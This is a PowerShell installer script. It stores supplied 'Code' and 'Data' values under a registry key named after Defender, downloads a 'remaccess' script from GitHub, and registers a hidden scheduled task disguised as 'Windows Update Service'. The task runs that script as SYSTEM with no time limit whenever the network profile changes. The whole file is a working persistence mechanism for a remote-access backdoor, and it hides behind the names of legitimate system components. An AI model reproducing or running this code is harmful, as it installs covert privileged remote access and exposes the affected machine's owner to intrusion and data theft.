# Prompt the user for the values
$code = Read-Host "Enter the code"
$data = Read-Host "Enter the data"
# Define the registry path
$regPath = "HKLM:\Software\Defender"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force
}
# Set the values in the Registry
Set-ItemProperty -Path $regPath -Name "Code" -Value $code
Set-ItemProperty -Path $regPath -Name "Data" -Value $data
$url = "https://github.com/DirNotAvailable/remaccess/raw/main/access-control"
$outputPath = "C:\Users\Default\accessctrl.ps1"
# Download the content from the URL and save it to the specified file
Invoke-WebRequest -Uri $url -OutFile $outputPath
$xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T00:56:52.6271595</Date>
    <Author>System\User</Author>
    <URI>\Windows Update Service</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>C:/Users/Default/accessctrl.ps1</Arguments>
    </Exec>
  </Actions>
</Task>
"@
# Register the task from the XML content
$taskName = "Windows Update Service"
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    # Task exists, so delete it
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    Write-Host "Task '$taskName' deleted."
} else {}
Register-ScheduledTask -Xml $xmlContent -TaskName $taskName
